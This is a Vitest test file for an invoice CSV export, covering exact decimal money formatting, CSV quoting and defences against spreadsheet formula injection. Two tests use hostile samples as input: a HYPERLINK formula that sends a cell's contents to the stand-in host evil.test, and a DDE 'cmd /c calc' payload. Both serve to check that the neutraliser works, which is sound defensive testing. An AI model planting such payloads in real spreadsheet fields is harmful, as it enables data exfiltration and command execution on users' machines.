import { describe, expect, it } from 'vitest'
import {
  CSV_HEADERS,
  buildInvoiceCsv,
  encodeCsvField,
  invoiceCsvFilename,
  minorUnitsFor,
  minorUnitsToDecimal,
  neutraliseFormula,
} from './csv'
import {
  LIVE_APPROVED_QUOTE_HEADER,
  LIVE_INVOICE_HEADER,
  LIVE_INVOICE_ROWS,
} from './csv.fixtures'
import type { InvoiceCsvRow } from './csv'

function row(overrides: Partial<InvoiceCsvRow> = {}): InvoiceCsvRow {
  return {
    invoice_number: 1,
    invoice_status: 'sent',
    currency: 'USD',
    issued_at: '2026-09-09T21:40:00.000Z',
    due_at: '2026-10-09',
    paid_at: null,
    payment_ref: null,
    client_name: 'Northwind Cold Store',
    client_billing_email: 'ap@northwind.test',
    job_number: 1,
    job_title: 'Freezer compressor rebuild',
    line_position: 1,
    line_kind: 'labor',
    description: 'Rebuild labour',
    unit: 'hr',
    quantity: '6.500',
    unit_price_cents: 11500,
    line_total_cents: 74750,
    line_tax_cents: 6167,
    tax_rate: '0.0825',
    ...overrides,
  }
}

describe('minorUnitsToDecimal', () => {
  it('formats ordinary amounts', () => {
    expect(minorUnitsToDecimal(125570)).toBe('1255.70')
    expect(minorUnitsToDecimal(11500)).toBe('115.00')
  })

  // Credits and discount lines are negative, and the sign must land before
  // the digits, not inside them.
  it('formats negatives', () => {
    expect(minorUnitsToDecimal(-7500)).toBe('-75.00')
    expect(minorUnitsToDecimal(-5)).toBe('-0.05')
  })

  it('pads the fraction', () => {
    expect(minorUnitsToDecimal(5)).toBe('0.05')
    expect(minorUnitsToDecimal(50)).toBe('0.50')
    expect(minorUnitsToDecimal(0)).toBe('0.00')
  })

  // JPY has no minor unit; BHD has three. An export hardcoding two is wrong
  // in both directions.
  it('respects the currency minor unit', () => {
    expect(minorUnitsToDecimal(7500, 0)).toBe('7500')
    expect(minorUnitsToDecimal(7500, 3)).toBe('7.500')
    expect(minorUnitsToDecimal(-7500, 3)).toBe('-7.500')
  })

  // The whole point: never divide. A caller handing this a float has already
  // lost precision somewhere upstream, and silently rounding hides it.
  it('refuses a non-integer amount rather than rounding it', () => {
    expect(() => minorUnitsToDecimal(1255.7)).toThrow(/non-integer/)
  })

  it('is exact for amounts a float would fumble', () => {
    // 0.1 + 0.2 territory: 1005 cents must not become 10.049999...
    expect(minorUnitsToDecimal(1005)).toBe('10.05')
    expect(minorUnitsToDecimal(2675)).toBe('26.75')
    // Large but still safe-integer.
    expect(minorUnitsToDecimal(999999999)).toBe('9999999.99')
  })

  it('maps currencies to their minor units', () => {
    expect(minorUnitsFor('USD')).toBe(2)
    expect(minorUnitsFor('jpy')).toBe(0)
    expect(minorUnitsFor('BHD')).toBe(3)
    expect(minorUnitsFor('ZZZ')).toBe(2)
  })
})

describe('neutraliseFormula', () => {
  // A client name is user-controlled text that lands in a bookkeeper's
  // spreadsheet. Excel and Sheets execute these.
  it('neutralises every formula trigger', () => {
    expect(neutraliseFormula('=1+1')).toBe("'=1+1")
    expect(neutraliseFormula('+44 7700 900000')).toBe("'+44 7700 900000")
    expect(neutraliseFormula('-lookup')).toBe("'-lookup")
    expect(neutraliseFormula('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(neutraliseFormula('\ttabbed')).toBe("'\ttabbed")
    expect(neutraliseFormula('\rreturn')).toBe("'\rreturn")
  })

  it('neutralises a real attack payload', () => {
    const attack = '=HYPERLINK("http://evil.test?x="&A1,"Invoice")'
    expect(neutraliseFormula(attack).startsWith("'=")).toBe(true)
  })

  it('leaves ordinary text alone', () => {
    expect(neutraliseFormula('Northwind Cold Store')).toBe(
      'Northwind Cold Store',
    )
    expect(neutraliseFormula('')).toBe('')
    expect(neutraliseFormula('2 + 2')).toBe('2 + 2')
  })
})

describe('encodeCsvField', () => {
  it('quotes and doubles embedded quotes', () => {
    expect(encodeCsvField('say "hi"')).toBe('"say ""hi"""')
  })

  it('quotes fields containing a delimiter or newline', () => {
    expect(encodeCsvField('Boiler, room 3')).toBe('"Boiler, room 3"')
    expect(encodeCsvField('line one\nline two')).toBe('"line one\nline two"')
  })

  it('quotes fields with surrounding whitespace, which would otherwise be lost', () => {
    expect(encodeCsvField(' ACME ')).toBe('" ACME "')
  })

  it('renders null and undefined as empty', () => {
    expect(encodeCsvField(null)).toBe('')
    expect(encodeCsvField(undefined)).toBe('')
  })

  // THE distinction that matters: a negative amount legitimately begins with
  // '-'. Neutralising it would write '-75.00 into the ledger.
  it('does NOT neutralise numeric fields', () => {
    expect(encodeCsvField('-75.00', 'number')).toBe('-75.00')
    expect(encodeCsvField('-0.05', 'number')).toBe('-0.05')
  })

  it('still neutralises the same string in a text column', () => {
    expect(encodeCsvField('-75.00', 'text')).toBe("'-75.00")
  })
})

describe('buildInvoiceCsv', () => {
  it('writes a header and one line per row', () => {
    const csv = buildInvoiceCsv([row(), row({ line_position: 2 })], {
      bom: false,
    })
    const lines = csv.trimEnd().split('\r\n')
    expect(lines[0]).toBe(CSV_HEADERS.join(','))
    expect(lines).toHaveLength(3)
  })

  it('uses CRLF and terminates the last record', () => {
    const csv = buildInvoiceCsv([row()], { bom: false })
    expect(csv.endsWith('\r\n')).toBe(true)
    expect(csv.split('\r\n').filter(Boolean)).toHaveLength(2)
  })

  it('prepends a BOM by default, for Excel on Windows', () => {
    expect(buildInvoiceCsv([], {}).startsWith('﻿')).toBe(true)
    expect(buildInvoiceCsv([], { bom: false }).startsWith('﻿')).toBe(false)
  })

  it('formats money as exact decimals', () => {
    const csv = buildInvoiceCsv([row()], { bom: false })
    const fields = csv.trimEnd().split('\r\n')[1].split(',')
    const at = (h: string) => fields[CSV_HEADERS.indexOf(h)]
    expect(at('unit_price')).toBe('115.00')
    expect(at('line_total')).toBe('747.50')
    expect(at('line_tax')).toBe('61.67')
  })

  it('carries a discount line through with its sign intact', () => {
    const csv = buildInvoiceCsv(
      [
        row({
          line_kind: 'discount',
          description: 'Service agreement discount',
          quantity: '1.000',
          unit_price_cents: -7500,
          line_total_cents: -7500,
          line_tax_cents: -619,
        }),
      ],
      { bom: false },
    )
    const fields = csv.trimEnd().split('\r\n')[1].split(',')
    const at = (h: string) => fields[CSV_HEADERS.indexOf(h)]
    expect(at('unit_price')).toBe('-75.00')
    expect(at('line_total')).toBe('-75.00')
    // Postgres rounds half away from zero, so -618.75 is -619, not -618.
    expect(at('line_tax')).toBe('-6.19')
  })

  it('truncates a timestamp to a UTC date and passes a date through', () => {
    const csv = buildInvoiceCsv([row()], { bom: false })
    const fields = csv.trimEnd().split('\r\n')[1].split(',')
    expect(fields[CSV_HEADERS.indexOf('issued_date')]).toBe('2026-09-09')
    expect(fields[CSV_HEADERS.indexOf('due_date')]).toBe('2026-10-09')
    expect(fields[CSV_HEADERS.indexOf('paid_date')]).toBe('')
  })

  it('switches decimal places for a zero-minor-unit currency', () => {
    const csv = buildInvoiceCsv(
      [
        row({
          currency: 'JPY',
          unit_price_cents: 11500,
          line_total_cents: 74750,
          line_tax_cents: 0,
        }),
      ],
      { bom: false },
    )
    const fields = csv.trimEnd().split('\r\n')[1].split(',')
    expect(fields[CSV_HEADERS.indexOf('unit_price')]).toBe('11500')
    expect(fields[CSV_HEADERS.indexOf('line_total')]).toBe('74750')
  })

  // End to end: a hostile client name must not survive as a formula, and must
  // not break the row it sits in either.
  it('survives a hostile client name without breaking the shape', () => {
    const hostile = '=cmd|\' /c calc\'!A1, "Ltd"'
    const csv = buildInvoiceCsv([row({ client_name: hostile })], { bom: false })
    const dataLine = csv.trimEnd().split('\r\n')[1]

    // Round-tripped through a real reader: the field count is unchanged
    // despite the embedded comma and quotes, and the value is the original
    // text with the formula prefix -- inert in a spreadsheet, intact as data.
    const parsed = parseCsvLine(dataLine)
    expect(parsed).toHaveLength(CSV_HEADERS.length)
    expect(parsed[CSV_HEADERS.indexOf('client_name')]).toBe(`'${hostile}`)
  })

  it('produces only a header for no rows', () => {
    expect(buildInvoiceCsv([], { bom: false })).toBe(
      `${CSV_HEADERS.join(',')}\r\n`,
    )
  })

  it('names the file by export date', () => {
    expect(invoiceCsvFilename(new Date('2026-09-09T23:00:00Z'))).toBe(
      'riglink-invoices-2026-09-09.csv',
    )
  })
})

describe('against a real invoice from the database', () => {
  // The fixture was generated by Postgres. If TypeScript and SQL ever disagree
  // about money, this is the test that says so.
  it('exported lines sum to the header the database computed', () => {
    const subtotal = LIVE_INVOICE_ROWS.reduce(
      (n, r) => n + r.line_total_cents,
      0,
    )
    const tax = LIVE_INVOICE_ROWS.reduce((n, r) => n + r.line_tax_cents, 0)
    expect(subtotal).toBe(LIVE_INVOICE_HEADER.subtotal_cents)
    expect(tax).toBe(LIVE_INVOICE_HEADER.tax_cents)
    expect(subtotal + tax).toBe(LIVE_INVOICE_HEADER.total_cents)
  })

  // An invoice that disagrees with the quote the client approved is a dispute.
  it('matches the approved quote it was raised from, to the cent', () => {
    expect(LIVE_INVOICE_HEADER).toEqual(LIVE_APPROVED_QUOTE_HEADER)
  })

  it('carries the negative tax on the discount line as the database computed it', () => {
    const discount = LIVE_INVOICE_ROWS.find((r) => r.line_kind === 'discount')
    // round(-618.75) -> -619. A .75 fraction, so JavaScript agrees here; the
    // engines only diverge on an exact half, which is asserted where it
    // belongs, in features/quotes/totals.fixtures.ts (round(-2.5) is -3 in
    // Postgres and -2 in JavaScript). The value is pinned from the database
    // regardless, because that is what the ledger will contain.
    expect(discount?.line_tax_cents).toBe(-619)
  })

  it('renders the whole invoice as parseable CSV with the right totals', () => {
    const csv = buildInvoiceCsv(LIVE_INVOICE_ROWS, { bom: false })
    const lines = csv.trimEnd().split('\r\n')
    expect(lines).toHaveLength(4)

    const totals = lines.slice(1).map((line) => {
      const fields = parseCsvLine(line)
      return {
        total: fields[CSV_HEADERS.indexOf('line_total')],
        tax: fields[CSV_HEADERS.indexOf('line_tax')],
      }
    })
    expect(totals).toEqual([
      { total: '747.50', tax: '61.67' },
      { total: '487.50', tax: '40.22' },
      { total: '-75.00', tax: '-6.19' },
    ])
  })
})

/** Minimal RFC 4180 reader, so the shape assertions above test real parsing. */
function parseCsvLine(line: string): Array<string> {
  const out: Array<string> = []
  let field = ''
  let inQuotes = false
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]
    if (inQuotes) {
      if (ch === '"' && line[i + 1] === '"') {
        field += '"'
        i++
      } else if (ch === '"') {
        inQuotes = false
      } else {
        field += ch
      }
    } else if (ch === '"') {
      inQuotes = true
    } else if (ch === ',') {
      out.push(field)
      field = ''
    } else {
      field += ch
    }
  }
  out.push(field)
  return out
}
